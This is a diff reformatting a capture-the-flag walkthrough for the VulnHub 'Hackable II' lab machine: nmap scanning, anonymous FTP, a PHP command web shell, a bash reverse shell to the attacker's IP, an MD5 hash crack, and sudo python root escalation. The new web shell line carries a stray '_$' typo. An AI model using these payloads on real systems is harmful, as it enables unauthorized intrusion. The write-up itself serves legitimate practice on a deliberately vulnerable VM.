@@ -1,18 +1,19 @@
 
-> You can find the [here](https://www.vulnhub.com/entry/hackable-ii,711/).
+>[!important] Source
+>You can find it [here](https://www.vulnhub.com/entry/hackable-ii,711/).
 
+---
 # Scanning :
 
 **We use Nmap for that**
 
-```bash
-nmap -A -sV 10.38.1.111
-```
+>[!danger] Command
+>```bash
+>nmap -A -sV 10.38.1.111
 
-**Output :**
-
-```sh
-PORT   STATE SERVICE VERSION
+>[!success] Output
+>```bash
+>PORT   STATE SERVICE VERSION
 21/tcp open  ftp     ProFTPD
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
@@ -25,115 +26,132 @@ PORT   STATE SERVICE VERSION
 |_http-title: Apache2 Ubuntu Default Page: It works
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
 
-> Note
+>[!warning] Notes
 >- So we see port 21 opened, which is for ftp. We also notice that **Anonymous FTP** is allowed, which means that we can connect via FTP without a user name or password.
 >- We also see that port 22 is opened, which is for ssh connection. For now it is useless as we don't have any credentials.
 >- Then we see port 80 open, which is for a web server. This is very interesting, as we usually start by searching there.
+
 
 # FTP analyzing
 
 **using ftp command**
 
-```sh
-ftp anonymous@10.38.1.111
-```
+>[!danger] Command
+>```bash
+>ftp anonymous@10.38.1.111
 
-> We find a file which is called CALL.html, but it doesn't seem to contain important informations.
+>[!warning] Notes
+>- We find a file which is called `CALL.html`, but it doesn't seem to contain important informations.
+
 
 # Web server scanning
 
-> We first check if there is any robots.txt file
-
-> There isn't
+>[!warning] Notes
+>- We first check if there is any `robots.txt` file, but the is not.
 
 **We will use dirb to scan for directories or files that might be interesting**
 
-```sh
-dirb http://10.38.1.111/ /usr/share/wordlists/dirb/common.txt # note : I use kali linux, who has already some default dictionaries
-```
+>[!danger] Command
+>```bash
+>dirb http://10.38.1.111/ /usr/share/wordlists/dirb/common.txt # I use this dictionary because it comes with Kali Linux
 
-**Output :**
+>[!success] Output
+>```bash
+>-----------------
+>DIRB v2.22    
+>By The Dark Raver
+>-----------------
+>
+>START_TIME: Mon Jul 31 14:23:08 2023
+>URL_BASE: http://10.38.1.111
+>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+>
+>-----------------
+>
+>GENERATED WORDS: 4612                                                          
+>
+>---- Scanning URL: http://10.38.1.111/ ----
+>=> DIRECTORY: http://10.38.1.111/files/                                                                           
+>+ http://10.38.1.111/index.html (CODE:200|SIZE:11239)                                                              
+>+ http://10.38.1.111/server-status (CODE:403|SIZE:276)                                                             
+   >                                                                                                                
+>---- Entering directory: http://10.38.1.111/files/ ----
+>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+>    (Use mode '-w' if you want to scan it anyway)
+>                                                                              
+>-----------------
+>END_TIME: Mon Jul 31 14:23:09 2023
+>DOWNLOADED: 4612 - FOUND: 2
 
-```sh
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+>[!warning] Notes
+>- We found a directory who is listable and called `files`, it might be interesting
 
-START_TIME: Mon Jul 31 14:23:08 2023
-URL_BASE: http://10.38.1.111
-WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://10.38.1.111/ ----
-==> DIRECTORY: http://10.38.1.111/files/                                                                           
-+ http://10.38.1.111/index.html (CODE:200|SIZE:11239)                                                              
-+ http://10.38.1.111/server-status (CODE:403|SIZE:276)                                                             
-                                                                                                                   
----- Entering directory: http://10.38.1.111/files/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                               
------------------
-END_TIME: Mon Jul 31 14:23:09 2023
-DOWNLOADED: 4612 - FOUND: 2
-```
-
-> We found a directory who is listable and called "files", it might be interesting
 
 # /files/ directory 
 
-> Note
->- /files/ is actually the ftp directory because we find the CALL.html file in it.
+>[!warning] Notes
+>- `/files/` is actually the ftp directory because we find the CALL.html file in it.
 >- It means that we can actually inject files in this directory and maybe obtain a reverse shell.
+
 
 # PHP command injection :
 
-> We create a php file which this code in it :
->
->```php
-><?php system($_GET["cmd"]) ?>
+>[!warning] Notes
+>- We already know that this is an Apache web server with PHP enabled, we can leverage from that
 
->Explanations : 
+>[!example] Code
+> We create a php file with this code in it :
+> ```php
+> <?php system($_GET["cmd"]_$) ?>
+> ```
+
+>[!question] Explanations
 >- The PHP `system()` function execute an external command and display the output.
 >- With `$_GET["cmd"]`, we can inject some commands in a variable named `cmd`, and it will be executed by the `system()` command.
 
+
 # Bash Reverse Shell :
 
-> Beforehand :
->We have to launch a listener on our attacking device, we'll use netcat : 
->```sh
->nc -l -p 1234```
+>[!warning] Notes
+>- We have to launch a listener on our attacking device, we'll use [netcat](https://docs.oracle.com/cd/E86824_01/html/E54763/netcat-1.html)
 
-> We just have to inject the following command in the `cmd` variable 
->```sh
->cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261"```
+>[!danger] Command
+>```bash
+>nc -l -p 1234
+>```
 
-> Explanations :
+>[!question] Explanations
+> - `-l` puts netcat in a listening mode
+> - `-p 1234` tells netcat to listen to connections on port 1234
+
+**From the target's compromised URL**
+
+>[!danger] Command
+> We just have to inject the following command in the `cmd` variable in the URL
+>```bash
+>cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261"
+
+>[!question] Explanations
 >- `-c`  tell to bash to read its instructions from a string, which is convenient when working on one line.
 >- `sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261` is just `sh -i >& /dev/tcp/10.38.1.110/1234 0>&1` [URL encoded](https://www.w3schools.com/tags/ref_urlencode.ASP) (it would not work otherwise)
 >- Overall, it tries to connect back to our **Attacker's device**.
 
-> Connection made
+>[!warning] Notes
+>- Connection made
 
 # Connected as www-data
 
-> We now want to gain access to a user account.
->We first list the /home directory, and we find a user named **shrek**
-
-> We also find a file named important.txt
->It tells us to go run a hidden bash script in the / directory names .runme.sh
+>[!warning] Notes
+>- We now want to gain access to a user account.
+>- We first list the `/home` directory, and we find a user named **shrek**
+>- We also find a file named `important.txt`
+>- It tells us to go run a hidden bash script in the `/` directory names `.runme.sh`
 >
 
-**Output** :
-
-```txt
-⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
+>[!success] Output
+>```txt
+>⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
 ⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
 ⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
 ⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
@@ -146,32 +164,30 @@ DOWNLOADED: 4612 - FOUND: 2
 ⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
 ⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
 ⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-    shrek:cf4c2232354952690368f1b3dfdfb24d
-```
+>    shrek:cf4c2232354952690368f1b3dfdfb24d
 
-> We now have what seems to be the hashed password of the shrek user.
-
->Common knowledge :
+>[!warning] Notes
+>- We now have what seems to be the hashed password of the shrek user. 
+>**Common knowledge :**
 >- Default password hashing in Linux systems is in MD5.
 >- We can use [tunnels up](https://www.tunnelsup.com/hash-analyzer/) to be sure of it.
 
 
 # Hash cracking 
 
-> Solutions
+>[!warning] Notes
 >- We can use John, but for simplicity, we will use [crackstation](https://crackstation.net/) 
 >- We find that the hash is in fact `onion`
 
+
 # SSH connection
 
-> Connection
+>[!warning] Notes
 >We now have the user : `shrek`, and the password: `onion`
 
-> USER FLAG
->We connect and find the following flag :
-
-```txt
->XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+>[!hint] USER FLAG
+>```txt
+>>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
@@ -210,27 +226,28 @@ XXXXXXXXXXl        cWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo   .............   :XXXX
 XXXXXXXXK.        dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0    ............   .KXX
 XXXXXXXX.        'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO   .............   'XXX
 invite-me: ["linkedin link, you will have to do the ctf to have it"]
-```
 
-# Privilege escalation's vectors :
+# Privilege escalation scanning:
 
-> Scanning for a vector of attack
->- We import from our attacking machine the `linpeas.sh` script, which is very efficient (`python -m http.server 8000` on the attacker device and `wget http://10.38.1.110:8000/linpeas.sh` from the ssh connection to the target device)
+>[!warning] Notes
+>- We import from our attacking machine the `linpeas.sh` script ([here](https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh)), which is very efficient (`python -m http.server 8000` on the attacker device and `wget http://10.38.1.110:8000/linpeas.sh` from the ssh connection) 
+>- We run it.
 
-> We then wait for the script to terminate.
 
 # Root access 
 
+>[!warning] Notes
 > We find, in the linpeas' script's output, that our user have all privileges with python3.5 :
 >```sh
 >shrek ALL = NOPASSWD:/usr/bin/python3.5
 >```
+
+>[!danger] Command
 >We then just spawn a bash shell with **sudo** command using python3.5 :
 >```sh
 >sudo /usr/bin/python3.5 -c 'import pty;pty.spawn("/bin/bash")'
 
-> Root access
-
+>[!hint] ROOT FLAG
 ```txt
                             ____
         ____....----''''````    |.
@@ -273,3 +290,4 @@ invite-me: ["linkedin link, you will have to do the ctf to have it"]
 
 invite-me: 
 ```
+
